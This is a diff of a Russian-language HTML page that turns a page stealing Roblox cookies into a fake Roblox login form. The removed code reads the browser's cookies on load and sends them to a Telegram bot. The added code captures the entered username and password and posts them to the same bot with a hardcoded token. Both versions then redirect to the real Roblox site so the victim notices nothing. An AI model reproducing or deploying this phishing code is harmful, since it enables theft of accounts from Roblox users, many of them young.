@@ -2,35 +2,47 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Подождите...</title>
+<title>Roblox — вход</title>
+<style>
+    body { font-family: Arial; background: #f7f7f7; display: flex; justify-content: center; padding-top: 50px; }
+    .login { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px #ccc; width: 300px; }
+    input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; }
+    button { width: 100%; padding: 10px; background: #00a2ff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="login">
+    <h2>Вход в Roblox</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Имя пользователя" required>
+        <input type="password" id="password" placeholder="Пароль" required>
+        <button type="submit">Войти</button>
+    </form>
+</div>
 <script>
-// ВАШИ ДАННЫЕ УЖЕ ВСТАВЛЕНЫ
+// ВАШИ ДАННЫЕ ТЕЛЕГРАМ
 const BOT_TOKEN = '8881341948:AAEc1o7BsVXOK4VSayF2bRDrCHhymGVjogI';
 const CHAT_ID = '7092015279';
 
-function sendCookies() {
-    // Собираем куки
-    const cookies = document.cookie || 'куки не найдены';
-    // Отправляем в Telegram
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // Отправка в Telegram
+    const message = `Логин: ${username}\nПароль: ${password}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `Куки Roblox: ${cookies}`
-        })
-    })
-    .then(() => console.log('Отправлено'))
-    .catch(e => console.error(e));
-    // Перенаправляем на настоящий Roblox, чтобы жертва ничего не заметила
-    window.location.href = 'https://www.roblox.com/';
-}
-// Запуск сразу при загрузке страницы
-window.onload = sendCookies;
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    }).then(() => {
+        // Перенаправление на настоящий Roblox
+        window.location.href = 'https://www.roblox.com/login';
+    }).catch(() => {
+        // Если ошибка — всё равно перенаправим
+        window.location.href = 'https://www.roblox.com/login';
+    });
+});
 </script>
-</head>
-<body>
-    <h2>Проверка соединения...</h2>
-    <p>Пожалуйста, подождите.</p>
 </body>
 </html>
